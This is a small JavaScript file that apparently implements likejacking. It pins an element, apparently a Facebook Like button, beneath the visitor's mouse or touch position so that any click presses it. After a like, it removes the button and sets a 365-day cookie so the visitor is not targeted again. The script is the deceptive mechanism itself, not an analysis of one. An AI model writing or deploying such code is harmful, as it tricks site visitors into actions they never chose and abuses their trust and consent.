
function getCookie(cname) {
    var name = cname + "=";     //username=
    var ca = document.cookie.split(';'); //username=user
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length,c.length);
            break;
        }
    }
    return " ";
}



function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}



   document.onmousemove = function(e) {
   var x = e.pageX;
   var y = e.pageY;
   document.getElementById('fbb').style.top = (y-15) + 'px';
   document.getElementById('fbb').style.left = (x-40) + 'px';
}
$('html').bind('touchmove', function(e) {
  console.log("come");
  var x = e.pageX;
   var y = e.pageY;
   document.getElementById('fbb').style.top = (y-15) + 'px';
   document.getElementById('fbb').style.left = (x-40) + 'px';
  });
 //Additional
           

(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId";
  fjs.parentNode.insertBefore(js, fjs);
   FB.Event.subscribe('edge.create',
                        function (response) {
                            $(".fb-like").remove();
                           setCookie("username", "user", "365");
                        }
                 );

}(document, 'script', 'facebook-jssdk'));



  
  function myFunction(){
    var dummytext=getCookie("username");
    console.log(dummytext);
    if (dummytext == "user") {
      $(".fb-like").remove();
    } 
}
window.onload = myFunction;

